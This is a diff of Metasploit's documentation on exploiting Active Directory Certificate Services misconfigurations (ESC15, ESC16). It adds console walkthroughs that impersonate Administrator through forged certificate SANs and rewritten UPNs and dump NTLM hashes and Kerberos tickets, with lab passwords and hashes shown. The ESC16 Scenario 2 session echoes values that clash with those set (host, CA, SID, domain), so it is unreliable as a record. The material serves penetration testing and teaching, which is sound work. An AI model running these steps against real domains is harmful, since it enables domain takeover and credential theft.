-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBDomain COLLALABS1
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBDomain COLLALABS1
 SMBDomain => COLLALABS1
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
 SMBPass => normalpass
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CA collalabs1-SRV-ADDS01-CA
+msf auxiliary(admin/dcerpc/icpr_cert) > set CA collalabs1-SRV-ADDS01-CA
 CA => collalabs1-SRV-ADDS01-CA
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC15-Test
+msf auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC15-Test
 CERT_TEMPLATE => ESC15-Test
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set ADD_CERT_APP_POLICY 1.3.6.1.4.1.311.20.2.1
+msf auxiliary(admin/dcerpc/icpr_cert) > set ADD_CERT_APP_POLICY 1.3.6.1.4.1.311.20.2.1
 ADD_CERT_APP_POLICY => 1.3.6.1.4.1.311.20.2.1
-msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+msf auxiliary(admin/dcerpc/icpr_cert) > run
 [*] Running module against 172.30.239.85
 
 [*] 172.30.239.85:445 - Requesting a certificate...
@@ -1053,24 +1449,24 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 [*] 172.30.239.85:445 -   * 1.3.6.1.4.1.311.20.2.1 (Certificate Request Agent)
 [*] 172.30.239.85:445 - Certificate stored at: /home/normaluser/.msf4/loot/20241009172714_default_172.30.239.85_windows.ad.cs_659672.pfx
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/icpr_cert) >
+msf auxiliary(admin/dcerpc/icpr_cert) >
 ```
 
 Next, the certificate is used in conjunction with the `PFX` and `ON_BEHALF_OF` options to issue a certificate compatible
 with Kerberos as the privileged user (previously `ALT_UPN`).
 
 ```
-msf6 auxiliary(admin/dcerpc/icpr_cert) > unset ADD_CERT_APP_POLICY 
+msf auxiliary(admin/dcerpc/icpr_cert) > unset ADD_CERT_APP_POLICY 
 Unsetting ADD_CERT_APP_POLICY...
-msf6 auxiliary(admin/dcerpc/icpr_cert) > unset ALT_UPN 
+msf auxiliary(admin/dcerpc/icpr_cert) > unset ALT_UPN 
 Unsetting ALT_UPN...
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE User
+msf auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE User
 CERT_TEMPLATE => User
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set ON_BEHALF_OF COLLALABS1\\administrator
+msf auxiliary(admin/dcerpc/icpr_cert) > set ON_BEHALF_OF COLLALABS1\\administrator
 ON_BEHALF_OF => COLLALABS1\\administrator
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set PFX /home/normaluser/.msf4/loot/20241009172714_default_172.30.239.85_windows.ad.cs_659672.pfx
+msf auxiliary(admin/dcerpc/icpr_cert) > set PFX /home/normaluser/.msf4/loot/20241009172714_default_172.30.239.85_windows.ad.cs_659672.pfx
 PFX => /home/normaluser/.msf4/loot/20241009172714_default_172.30.239.85_windows.ad.cs_659672.pfx
-msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+msf auxiliary(admin/dcerpc/icpr_cert) > run
 [*] Running module against 172.30.239.85
 
 [*] 172.30.239.85:445 - Requesting a certificate...
@@ -1079,10 +1475,172 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 [*] 172.30.239.85:445 - Certificate UPN: administrator@collalabs1.local
 [*] 172.30.239.85:445 - Certificate stored at: /home/normaluser/.msf4/loot/20241009172817_default_172.30.239.85_windows.ad.cs_427087.pfx
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/icpr_cert) >
+msf auxiliary(admin/dcerpc/icpr_cert) >
 ```
 
 Finally, *this* certificate can be used to authenticate to Kerberos with the `kerberos/get_ticket` module.
+
+# Exploiting ESC16
+ESC16 refers to a CA-level misconfiguration where the SID security extension (OID `1.3.6.1.4.1.311.25.2`), introduced in
+the May 2022 KB5014754 update, is globally disabled. This extension allows domain controllers to securely map
+certificates to user or computer SIDs for strong authentication.
+
+When this OID is listed under the CA’s `DisableExtensionList` registry key, which is located:
+`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA-Name>\PolicyModules\<PolicyModuleName>\`
+all certificates issued by the CA will lack the SID binding, making every template behave as though it has the 
+`CT_FLAG_NO_SECURITY_EXTENSION` flag (essentially ESC9). After updating the `DisableExtensionList` the machine will need
+to be restarted for the changes to take effect. The `DisableExtensionList` under the default policy can be updated in
+order to exploit (a new policy is not required).
+
+## ESC16 Scenario 1
+If domain controllers aren’t in Full Enforcement mode (`StrongCertificateBindingEnforcement` != 2), they fall back to
+weaker mapping methods like UPN or DNS from the certificate’s SAN potentially reintroducing risks similar to the
+Certifried vulnerability (CVE-2022-26923) or ESC9 however for our purposes given the `DisableExtensionList` is called 
+"ESC16 Scenario 1". The way you exploit ESC16 scenario 1 with Metasploit is identical to how you would exploit ESC9:
+
+```
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set rhosts 172.16.199.200
+rhosts => 172.16.199.200
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set ldaprport 389
+ldaprport => 389
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set target_username user2
+target_username => user2
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set ldapdomain kerberos.issue
+ldapdomain => kerberos.issue
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set ldappassword N0tpassword!
+ldappassword => N0tpassword!
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set ldapusername user1
+ldapusername => user1
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set UPDATE_LDAP_OBJECT_VALUE Administrator
+UPDATE_LDAP_OBJECT_VALUE => Administrator
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set ca kerberos-dc2-ca
+ca => kerberos-dc2-ca
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set cert_template ESC16-Template
+cert_template => ESC16-Template
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > run
+[*] Running module against 172.16.199.200
+[*] 172.16.199.200:445 - Loading auxiliary/admin/ldap/ldap_object_attribute
+[*] 172.16.199.200:445 - Running auxiliary/admin/ldap/ldap_object_attribute
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Current value of user2's userPrincipalName: user2
+[*] Attempting to update userPrincipalName for CN=user2,CN=Users,DC=kerberos,DC=issue to Administrator...
+[+] Successfully updated CN=user2,CN=Users,DC=kerberos,DC=issue's userPrincipalName to Administrator
+[+] The operation completed successfully!
+[*] 172.16.199.200:445 - Adding shadow credentials for user2
+[*] 172.16.199.200:445 - Loading admin/ldap/shadow_credentials
+[*] 172.16.199.200:445 - Running admin/ldap/shadow_credentials
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Discovering base DN automatically
+[*] 172.16.199.200:389 Discovered base DN: DC=kerberos,DC=issue
+[*] Certificate stored at: /Users/jheysel/.msf4/loot/20250717152132_default_172.16.199.200_windows.ad.cs_473934.pfx
+[+] Successfully updated the msDS-KeyCredentialLink attribute; certificate with device ID 0d055983-7921-797a-529e-259b4b7542a2
+[*] 172.16.199.200:445 - Loading admin/kerberos/get_ticket
+[*] 172.16.199.200:445 - Getting hash for user2
+[!] Warning: Provided principal and realm (user2@kerberos.issue) do not match entries in certificate:
+[+] 172.16.199.200:88 - Received a valid TGT-Response
+[*] 172.16.199.200:88 - TGT MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717152132_default_172.16.199.200_mit.kerberos.cca_930617.bin
+[*] 172.16.199.200:88 - Getting NTLM hash for user2@kerberos.issue
+[+] 172.16.199.200:88 - Received a valid TGS-Response
+[*] 172.16.199.200:88 - TGS MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717152132_default_172.16.199.200_mit.kerberos.cca_355422.bin
+[+] Found NTLM hash for user2: aad3b435b51404eeaad3b435b51404ee:4fd408d8f8ecb20d4b0768a0ac44b71f
+[+] 172.16.199.200:445 - The requested certificate was issued.
+[*] 172.16.199.200:445 - Certificate Policies:
+[*] 172.16.199.200:445 -   * 1.3.6.1.5.5.7.3.2 (Client Authentication)
+[*] 172.16.199.200:445 - Certificate UPN: Administrator
+[*] 172.16.199.200:445 - Certificate stored at: /Users/jheysel/.msf4/loot/20250717152134_default_172.16.199.200_windows.ad.cs_383174.pfx
+[*] 172.16.199.200:445 - reverting ldap object
+[*] 172.16.199.200:445 - Loading admin/ldap/shadow_credentials
+[*] 172.16.199.200:445 - Running admin/ldap/shadow_credentials
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Discovering base DN automatically
+[*] 172.16.199.200:389 Discovered base DN: DC=kerberos,DC=issue
+[+] Deleted entry with device ID 0d055983-7921-797a-529e-259b4b7542a2
+[*] 172.16.199.200:445 - Loading auxiliary/admin/ldap/ldap_object_attribute
+[*] 172.16.199.200:445 - Running auxiliary/admin/ldap/ldap_object_attribute
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Current value of user2's userPrincipalName: Administrator
+[*] Attempting to update userPrincipalName for CN=user2,CN=Users,DC=kerberos,DC=issue to user2...
+[+] Successfully updated CN=user2,CN=Users,DC=kerberos,DC=issue's userPrincipalName to user2
+[+] The operation completed successfully!
+[*] Auxiliary module execution completed
+```
+
+With the certificate issued, the attacker can then use the `kerberos/get_ticket` module to obtain the hash of the admin user:
+```
+msf6 auxiliary(admin/kerberos/get_ticket) > get_hash rhost=172.16.199.200 cert_file=//Users/jheysel/.msf4/loot/20250717152134_default_172.16.199.200_windows.ad.cs_383174.pfx username=Administrator domain=kerberos.issue
+[*] Running module against 172.16.199.200
+[!] Warning: Provided principal and realm (Administrator@kerberos.issue) do not match entries in certificate:
+[!]   * Administrator@
+[+] 172.16.199.200:88 - Received a valid TGT-Response
+[*] 172.16.199.200:88 - TGT MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717152325_default_172.16.199.200_mit.kerberos.cca_344926.bin
+[*] 172.16.199.200:88 - Getting NTLM hash for Administrator@kerberos.issue
+[+] 172.16.199.200:88 - Received a valid TGS-Response
+[*] 172.16.199.200:88 - TGS MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717152325_default_172.16.199.200_mit.kerberos.cca_598018.bin
+[+] Found NTLM hash for Administrator: aad3b435b51404eeaad3b435b51404ee:4fd408d8f8ecb20d4b0768a0ac44b71f
+[*] Auxiliary module execution completed
+```
+
+#### ESC16 Scenario 2
+If domain controllers are in Full Enforcement mode (`StrongCertificateBindingEnforcement` == 2), ESC16 alone would normally
+prevent authentication using certificates that lack the required SID extension. However, if the CA is also vulnerable
+to ESC6, which is defined as: `EDITF_ATTRIBUTESUBJECTALTNAME2` flag is set under it's `EditFlags` registry key, located here:
+`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA-Name>\PolicyModules\<PolicyModuleName>\`
+then the CA accepts arbitrary SAN values from certificate request attribute and an attacker can still bypass strong
+certificate mapping.
+
+In this case, the attacker requests a certificate from the ESC16-affected CA using any client authentication template
+(like "User"), which ensures the SID security extension is omitted. At the same time, they exploit the ESC6 weakness to
+inject a custom Subject Alternative Name that includes both a forged UPN and a specially crafted SID value using the format:
+`URI:tag:microsoft.com,2022-09-14:sid:<SID>`. This format was introduced in the May 2022 KB5014754 update and
+intended to help support strong certificate mappings between the user SID and the certificate.
+
+Because the certificate lacks the official SID extension (due to ESC16) but includes a valid-looking SAN SID URI
+(via ESC6), the domain controller accepts it and maps the certificate using the supplied SID—even in Full Enforcement mode.
+
+The way you would exploit ESC16 Scenario 2 with Metasploit is different than Scenario 1 as we don't need to update
+any LDAP objects, and so we can use the `icpr_cert` module to request a certificate. 
+```
+msf6 auxiliary(admin/dcerpc/icpr_cert) >  set alt_sid S-1-5-21-2324486357-3075865580-3606784161-500
+alt_sid => S-1-5-21-1655260159-4293876351-2321352318-500
+msf6 auxiliary(admin/dcerpc/icpr_cert) >  set alt_upn Administrator@kerberos.issue
+alt_upn => Administrator@msf.local
+msf6 auxiliary(admin/dcerpc/icpr_cert) >  set ca kerberos-DC2-CA
+ca => msf-DC3-CA
+msf6 auxiliary(admin/dcerpc/icpr_cert) >  set cert_template User
+cert_template => User
+msf6 auxiliary(admin/dcerpc/icpr_cert) >  set RHOSTS 172.16.199.200
+RHOSTS => 172.16.199.130
+msf6 auxiliary(admin/dcerpc/icpr_cert) >  set smbdomain kerberos.issue
+smbdomain => msf.local
+msf6 auxiliary(admin/dcerpc/icpr_cert) >  set smbpass N0tpassword!
+smbpass => N0tpassword!
+msf6 auxiliary(admin/dcerpc/icpr_cert) >  set smbuser user1
+smbuser => user1
+msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+[*] Running module against 172.16.199.200
+[+] 172.16.199.200:445 - The requested certificate was issued.
+[*] 172.16.199.200:445 - Certificate Policies:
+[*] 172.16.199.200:445 -   * 1.3.6.1.5.5.7.3.2 (Client Authentication)
+[*] 172.16.199.200:445 -   * 1.3.6.1.5.5.7.3.4 (Secure Email)
+[*] 172.16.199.200:445 -   * 1.3.6.1.4.1.311.10.3.4 (Encrypting File System)
+[*] 172.16.199.200:445 - Certificate UPN: Administrator@kerberos.issue
+[*] 172.16.199.200:445 - Certificate URI: tag:microsoft.com,2022-09-14:sid:S-1-5-21-2324486357-3075865580-3606784161-500, S-1-5-21-2324486357-3075865580-3606784161-500
+[*] 172.16.199.200:445 - Certificate stored at: /Users/jheysel/.msf4/loot/20250711145606_default_172.16.199.200_windows.ad.cs_597422.pfx
+[*] Auxiliary module execution completed
+
+
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > use admin/kerberos/get_ticket
+[*] Using action GET_TGT - view all 3 actions with the show actions command
+msf6 auxiliary(admin/kerberos/get_ticket) > get_hash rhost=172.16.199.200 cert_file=/Users/jheysel/.msf4/loot/20250711145606_default_172.16.199.200_windows.ad.cs_597422.pfx
+[*] Running module against 172.16.199.200
+[+] 172.16.199.200:88 - Received a valid TGT-Response
+[*] 172.16.199.200:88 - TGT MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250711145619_default_172.16.199.200_mit.kerberos.cca_635830.bin
+[*] 172.16.199.200:88 - Getting NTLM hash for Administrator@kerberos.issue
+[+] 172.16.199.200:88 - Received a valid TGS-Response
+[*] 172.16.199.200:88 - TGS MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250711145619_default_172.16.199.200_mit.kerberos.cca_787259.bin
+[+] Found NTLM hash for Administrator: aad3b435b51404eeaad3b435b51404ee:4fd408d8f8ecb20d4b0768a0ac44b71f
+[*] Auxiliary module execution completed
+```
 
 # Authenticating With A Certificate
 Metasploit supports authenticating with certificates in a couple of different ways. These techniques can be used to take
@@ -1100,7 +1658,7 @@ Certificates can be used to obtain the NTLM hash of an account with the PKINIT e
 action to `GET_HASH`.
 
 ```msf
-msf6 auxiliary(admin/kerberos/get_ticket) > get_hash rhosts=172.30.239.85 cert_file=/home/smcintyre/.msf4/loot/20230505083913_default_172.30.239.85_windows.ad.cs_275324.pfx
+msf auxiliary(admin/kerberos/get_ticket) > get_hash rhosts=172.30.239.85 cert_file=/home/smcintyre/.msf4/loot/20230505083913_default_172.30.239.85_windows.ad.cs_275324.pfx
 [*] Running module against 172.30.239.85
 
 [+] 172.30.239.85:88 - Received a valid TGT-Response
@@ -1110,7 +1668,7 @@ msf6 auxiliary(admin/kerberos/get_ticket) > get_hash rhosts=172.30.239.85 cert_f
 [*] 172.30.239.85:88 - TGS MIT Credential Cache ticket saved to /home/smcintyre/.msf4/loot/20230505094204_default_172.30.239.85_mit.kerberos.cca_031414.bin
 [+] Found NTLM hash for Administrator: aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/kerberos/get_ticket) >
+msf auxiliary(admin/kerberos/get_ticket) >
 ```
 
 ### Getting A Kerberos Ticket
@@ -1118,21 +1676,21 @@ Certificates can be used to issue a Kerberos ticket granting ticket (TGT) which 
 services such as HTTP, LDAP and SMB. Ticket granting tickets can be requested using the `GET_TGT` action.
 
 ```msf
-msf6 auxiliary(admin/kerberos/get_ticket) > get_tgt rhosts=172.30.239.85 cert_file=/home/smcintyre/.msf4/loot/20230124173224_default_172.30.239.85_windows.ad.cs_287833.pfx
+msf auxiliary(admin/kerberos/get_ticket) > get_tgt rhosts=172.30.239.85 cert_file=/home/smcintyre/.msf4/loot/20230124173224_default_172.30.239.85_windows.ad.cs_287833.pfx
 [*] Running module against 172.30.239.85
 
 [*] 172.30.239.85:88 - Getting TGT for Administrator@daforest.com
 [+] 172.30.239.85:88 - Received a valid TGT-Response
 [*] 172.30.239.85:88 - TGT MIT Credential Cache ticket saved to /home/smcintyre/.msf4/loot/20230124202354_default_172.30.239.85_mit.kerberos.cca_566767.bin
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/kerberos/get_ticket) > klist
+msf auxiliary(admin/kerberos/get_ticket) > klist
 Kerberos Cache
 ==============
 host           principal                   sname                             issued                     status  path
 ----           ---------                   -----                             ------                     ------  ----
 172.30.239.85  Administrator@daforest.com  krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL  2023-01-24 20:23:54 -0500  valid   /home/smcintyre/.msf4/loot/20230124202354_default_172.30.239.85_mit.kerberos.cca_566767.bin
 
-msf6 auxiliary(admin/kerberos/get_ticket) >
+msf auxiliary(admin/kerberos/get_ticket) >
 ```
 
 Once the TGT has been issued, it can be seen in the output of the `klist` command. With the TGT saved, it will
@@ -1148,16 +1706,16 @@ use schannel authentication a few options must be set.
 * `SSL` -- must be set to `true` (`schannel` authentication is only compatible with TLS connections)
 
 ```msf
-msf6 auxiliary(gather/ldap_query) > set RHOSTS 172.30.239.85
+msf auxiliary(gather/ldap_query) > set RHOSTS 172.30.239.85
 RHOSTS => 172.30.239.85
-msf6 auxiliary(gather/ldap_query) > set LDAP::Auth schannel
+msf auxiliary(gather/ldap_query) > set LDAP::Auth schannel
 LDAP::Auth => schannel
-msf6 auxiliary(gather/ldap_query) > set LDAP::CertFile /home/smcintyre/.msf4/loot/20230505083913_default_172.30.239.85_windows.ad.cs_275324.pfx
+msf auxiliary(gather/ldap_query) > set LDAP::CertFile /home/smcintyre/.msf4/loot/20230505083913_default_172.30.239.85_windows.ad.cs_275324.pfx
 LDAP::CertFile => /home/smcintyre/.msf4/loot/20230505083913_default_172.30.239.85_windows.ad.cs_275324.pfx
-msf6 auxiliary(gather/ldap_query) > set SSL true
+msf auxiliary(gather/ldap_query) > set SSL true
 [!] Changing the SSL option's value may require changing RPORT!
 SSL => true
-msf6 auxiliary(gather/ldap_query) > enum_domain
+msf auxiliary(gather/ldap_query) > enum_domain
 [*] Running module against 172.30.239.85
 
 [*] Discovering base DN automatically
@@ -1178,5 +1736,5 @@ DC=msflab DC=local
  objectsid                  S-1-5-21-3402587289-1488798532-3618296993
 
 [*] Auxiliary module execution completed
-msf6 auxiliary(gather/ldap_query) >
+msf auxiliary(gather/ldap_query) >
 ```
